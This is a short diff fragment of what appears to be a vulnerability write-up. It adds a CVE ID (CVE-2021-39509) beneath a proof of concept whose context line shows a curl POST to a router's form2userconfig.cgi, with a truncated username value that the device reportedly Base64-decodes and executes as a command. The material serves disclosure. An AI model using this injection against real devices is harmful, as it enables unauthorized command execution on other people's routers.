@@ -30,3 +30,6 @@ curl -i -X POST http://192.168.33.9/goform/form2userconfig.cgi  -d "username=Ijt
 ```
 It will decode our command Base64 and execute it 
 
+### CVE ID
+CVE-2021-39509
+
